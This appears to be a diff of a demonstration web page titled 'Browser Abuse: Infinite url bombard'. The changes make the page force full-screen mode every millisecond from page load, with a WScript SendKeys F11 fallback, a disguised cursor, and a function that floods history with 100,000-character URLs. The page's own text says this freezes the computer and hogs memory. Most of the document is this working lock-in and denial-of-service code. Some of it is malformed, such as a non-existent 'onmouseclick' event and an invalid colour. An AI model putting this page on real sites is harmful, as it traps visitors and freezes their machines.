@@ -11,6 +11,11 @@
 </style>
 
 <script> 
+
+	function callerinterval(){
+		setInterval(function(){requestFullScreen(); }, 1);
+	}
+
 	function bomb_url() {
 	  var total = "";
 	  for( var i = 0; i < 100000; i++ ) {
@@ -34,7 +39,7 @@
 
 	  // Supports: IE, Firefox, Safari, Chrome, Opera and most browsers
 	  // https://developer.mozilla.org/en-US/docs/Web/API/Element/requestFullScreen
-	  var request = element.requestFullScreen || element.webkitRequestFullScreen || element.mozRequestFullScreen || element.msRequestFullScreen;
+	  var request = element.requestFullScreen || element.webkitRequestFullScreen 
 
 	  if (request) { // Native full screen 
 	    request.call(element);
@@ -45,21 +50,24 @@
 	      wscript.SendKeys("{F11}");
 	    }
 	  }
-	  intervalCall();
+	}
+
+	function move() {
+   		intervalCall();
 	}
 
 </script>
 </head>
 
-<body>
 
-<div onclick="alert('You clicked me !')">
+<body onmouseclick="move()" onLoad="callerinterval()" style="background:#00000 url('transparent.jpeg') no-repeat top right; cursor: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAMAAAD04JH5AAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAPUExURQAAAAICAgAAAP///5WVlXiCGdAAAAADdFJOUwD8ZX+n/7gAAABvSURBVHja7dbBAUAwEABBQf81i6CGfZipYB3J2bY/GnnAHgec9QjOY9QBccEMaAvugLRgBZQFT0BY8AZ0BV9AVvB8hEt3D8SnYIz2FMxtlI7gfvVzBN1OXM9+1Dsx/ykAAAAAAAAAAAAAAAAAgNcFnc4A9qwo+wMAAAAASUVORK5CYII=&quot;) 128 128, crosshair;">
+
+<div>
 	<Strong>Browser Abuse: Infinite url bombard </Strong>
 	<p> In this browser abuse, user clicks button or any part of the page, the page goes to full screen mode. </p>
 	<p> When user tries to get out of full screen mode, the infinite url freezes computer and creates memory hog </p>
 	<p> <Strong> Technique used:</Strong> Set interval with small timeframe less than a second, and history replace with long random digits or characters </p>
-	<input id="clickbutton" type="button" value="Click me" onclick="requestFullScreen()" /> <br /> <br /> <br /> 
-	<img src="infinity.png" onclick="requestFullScreen()"/ >
+	<input id="clickbutton" type="button" value="Click me" onclick="move()" /> <br /> <br /> <br /> 
 </div>
 
 </body>
